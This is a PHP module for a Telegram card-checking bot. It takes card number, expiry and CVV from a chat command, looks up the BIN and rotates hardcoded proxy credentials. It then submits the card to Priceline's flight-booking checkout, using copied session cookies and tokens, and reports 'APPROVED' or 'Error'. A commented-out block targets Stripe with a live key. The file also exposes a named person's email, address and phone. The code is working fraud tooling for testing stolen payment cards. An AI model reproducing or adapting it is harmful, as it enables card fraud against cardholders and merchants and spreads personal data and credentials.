<?php

//=====================[Stripe Inline Charge (1$)]======================//
#----------------[SITE: https://lambdahouston.com/]---------------#

if ((strpos($message, "/fi") === 0) || (strpos($message, "!fi") === 0)){
$lista = substr($message, 4);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon    = $i[1];
$year  = $i[2];
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$last4 = substr($cc, 12,  4);
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";


//==================[BIN LOOK-UP]======================//

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$type = $binna['type'];
$level = $binna['category'];
$country = $binna['country']['name'];
$emoji = $binna['country']['emoji'];
$bank = $binna['bank']['name'];
//$bank = getStr($bindata,'"bank": {"name": "', '"')));
curl_close($ch);

$bindata1 = " $bin - $brand - $type - $level - $bank - $country($emoji)";

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

//=======================[Proxys]=============================//
$Websharegay = rand(0,250);
$rp1 = array(
    1 => 'acldsyyv-rotate:ew9cjcxheh13',
    2 => 'zjthcoen-rotate:l3yrxcnqrx9a',
    3 => 'jvqtpsin-rotate:pue7hqq01n2p',
    4 => 'ucmcaveu-rotate:4vuuar0vypb3',
    ); 
    $rotate = $rp1[array_rand($rp1)];
////==============[Proxy Section]===============////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead! ❌";
}

/*
//=======================[1 REQ]==================================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=23b8744c-9e16-45a8-ae43-d5a0de2c54a0809da8&muid=14d3f9b6-4ad5-463e-986b-ce4f06326b6678b576&sid=335b3ae9-48c9-4dfe-8866-a173100ca362f095ff&pasted_fields=number&payment_user_agent=stripe.js%2Fd82978cf4%3B+stripe-js-v3%2Fd82978cf4&time_on_page=196269&key=pk_live_YcqVYxtfUkpD6HBlAPnUAhkp');

 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 curl_close($ch);
*/

//=======================[2 REQ]==================================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.priceline.com/pws/v0/cart-checkout-service/graph?action=airBook&request-id=O6ktdHDejgYCQWnq3sCapUWGpODXDT6M');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.priceline.com',
'method: POST',
'path: /pws/v0/cart-checkout-service/graph?action=airBook&request-id=O6ktdHDejgYCQWnq3sCapUWGpODXDT6M',
'scheme: https',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'apollographql-client-name: cart-checkout',
'apollographql-client-version: master-1.1.801',
'content-type: application/json; charset=utf-8',
'cookie: DCS=MnwxNjQxOTkwNTYwfmVhc3QtcmVnaW9u.dTJ6LzY4ckNHaEtzSTMzbTlWcVAyOWJiM2ZWb09xMUY2Qmh0WGlSdk0zVT0=; PL_CINFO=e5396af9e00d0d71a4a511ba8b84d9d3~1641990560~v2; SITESERVER=ID=e5396af9e00d0d71a4a511ba8b84d9d3; vid=v202201121229373963e842; pxcts=598dee20-73a3-11ec-af72-0f8ae6080f5a; _pxvid=598d9021-73a3-11ec-91a7-704e434a616b; G_ENABLED_IDPS=google; forterToken=aeb36fca94be43da94c57441e8249d7e_1641990708756_50_UAL9_6; OptanonConsent=isIABGlobal=false&datestamp=Wed+Jan+12+2022+18%3A01%3A49+GMT%2B0530+(India+Standard+Time)&version=6.6.0&hosts=&consentId=75603b32-2774-4694-b755-cfa31eb1f998&interactionCount=0&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1%2CC0003%3A1%2CSPD_BG%3A1&AwaitingReconsent=false; pclnguidse=b797621767c64c364bac018d2d9e591e055d1438; pclnguidpe=b797621767c64c364bac018d2d9e591e055d1438; _px3=0ae3ef5fb1a6cfbccc08d057a6ba4b05209d1e61f3fd20901bf95f2e3ca6baef:Za9t8sNKw6Y3B+WetC7EBUfJxgPUDz3rVsWKdKTnMPhAJuSXm6bAIYVuN/lnTxodnEQnu/jCcb0W9l2RsWGDGQ==:1000:5/stQUhr+b0OW2LFrKF08O9ToL6D1dEKafqc2n6LsgyHdr7WQPwxXiGjyRoZo1ylZyyGv5xdh0b6XjhUWefpu72IAs2cl96LQTT2cChB78TnhIkn1C+QECsucHGZdzstr4HGdLeKSQyGrPRBSVVeGKoxlh6w8yFTFjSr4wxi3Y3a+znzIpLSeGfb16IXsqUaMSuTWOPng9d0vCqbFQslNQ==; _px2=eyJ1IjoiNWEyZWU5MTAtNzNhMy0xMWVjLWJkYzYtNjU4ZWJkZTIxYWRkIiwidiI6IjU5OGQ5MDIxLTczYTMtMTFlYy05MWE3LTcwNGU0MzRhNjE2YiIsInQiOjE2NDE5OTE4NjI1NDYsImgiOiJiNmY3MTdlNDIwYThmZWJhZTZmYzgxZmI1NmU4OGM5YmViY2Y2ZDE1Y2MxYzM1ZDVkMDViMGY2NjFjOTNmOTlkIn0=; _pxde=ef428216c29f56a309ccf9308fe1e4475bf543740fe4f816bd9db03329d232bd:eyJ0aW1lc3RhbXAiOjE2NDE5OTE1NjI1NDYsImZfa2IiOjB9; Referral=CLICKID=&WEBENTRYTIME=1%2F12%2F2022%2012%3A46%3A06&ID=DIRECT&PRODUCTID=&SOURCEID=DT',
'origin: https://www.priceline.com',
'pkg-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2NDE5OTA3MDN9.GYFIV3bbRhO15oo7gdYaCyZ3UMrotKlO3GxW8qczQ-0',
'referer: https://www.priceline.com/cart/checkout/e10ec792-5ae3-4bd6-9372-dc6f8baf2cbf/booking?vrid=19f5fa7caa9e98cdb9ba8db33366dd64',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'sec-gpc: 1',
'source-id: PKGFLEX',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'{"query":"\n  query bookRequest(\n    $commonBookVariables: CommonBookVariables\n    $itinerary: [StandaloneFlightBookingInput]!\n    $promotionInformation: PromotionInformation\n    $sourceId: String\n  )  {\n    airBook(\n      commonBookVariables: $commonBookVariables\n      itinerary: $itinerary\n      promotionInformation: $promotionInformation\n      sourceId: $sourceId\n    ) {\n      status\n      reason {\n        code\n        message\n      }\n      dashboardUrl\n      errors(itinerary: $itinerary) {\n        code\n        message\n        productId\n        type\n        itineraryKey\n        componentKey\n      }\n      offerNumber\n      offerToken\n      requestId\n      \n    }\n  }","variables":{"customVariables":null,"commonBookVariables":{"totalCost":81.98,"totalPayLater":0,"travelers":[{"itineraryKey":0,"firstName":"Avinash","middleName":"","lastName":"Meena","suffix":"","dateOfBirth":"10/27/2002","gender":"M","id":0}],"customer":{"email":"avinkumar2110@gmail.com","address":{"addressLine":["3370 Farnum Road"],"cityName":"NEW YORK","stateCode":"NY","countryCode":"us","postalCode":"10011"},"customerAlerts":[{"alertID":1,"alertType":1000,"subscribeFlag":true}],"telephones":[{"phoneNumber":"9174094599","areaCityCode":"917","countryAccessCode":"1","phoneLocationType":"C","extension":"","defaultInd":""}]},"contract":{"referenceId":"07e73efa-ee1b-49f4-8ead-c6423bec59f6","initials":"AK"},"billing":{"paymentCard":{"creditCardKey":null,"cardHolderName":"Avin Kumar","address":{"addressLine":["3370 Farnum Road"],"cityName":"NEW YORK","stateCode":"NY","countryCode":"us","postalCode":"10011"},"ccBrandID":-1,"ccBrandFeeTypeID":0,"ccBrandMemberID":"","actualCCTypeCode":"","actualCCNumLastFourDigits":"'.$last4.'","cardNumber":"'.$cc.'","cardType":"VI","cardCode":"'.$cvv.'","expireDate":"'.$mes.'-'.$ano.'","paymentInstrumentType":"CREDIT_CARD"}},"sessionKey":"f83a7491-a1ad-4b68-a937-30ff27bd6fb4","isSkipDuplicateCheck":false,"protection":{"acceptedToken":"","declinedToken":"v2REN-fjE2MjEyODI1MTQ6MC4wMDpVU0R-djIwMjIwMTEyMTIyOTM3Mzk2M2U4NDJ-IDoyNDpVU35BTExJQU5a","amount":"undefined","isExplicitlyDeclined":true}},"itinerary":[{"key":0,"productId":1,"type":"FLY","componentKey":"FLY-768140","itemKey":"R_F_DEL_IXU_202201141750_441_AI","priceKey":"S_NL_NL","itemDetailsKey":"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","gordianInfo":[{"productId":"19F","price":"7.00","displayName":"Seat: 19F, AI 441","currency":"USD","status":"offered","sessionId":302312864,"uniqueId":1627279529,"carrier":"AI","basePrice":0,"markupAmount":7,"paxId":"p1","flightString":"DEL*2022-01-14T17:50*AI*441*IXU*2022-01-14T19:35","segmentRefId":1}]}],"sourceId":"PKGFLEX"},"operationName":"bookFlight"}');

$result2 = curl_exec($ch);
//$msg = trim(strip_tags(getStr($result2,'"message":"','"')));
//$exp_msg = trim(strip_tags(getStr($result2,'"exceptionMessage":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);


//==================[Responses]======================//

if ((strpos($result2, 'success'))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐈𝐧𝐥𝐢𝐧𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 (𝟏$) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$result2.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}


else{
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐒𝐭𝐫𝐢𝐩𝐞 𝐈𝐧𝐥𝐢𝐧𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 (𝟏$) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>Error!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$result2.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}


curl_close($ch);
unlink("cookies.txt");
}

//====================[Stripe Inline Charge]=====================//

?>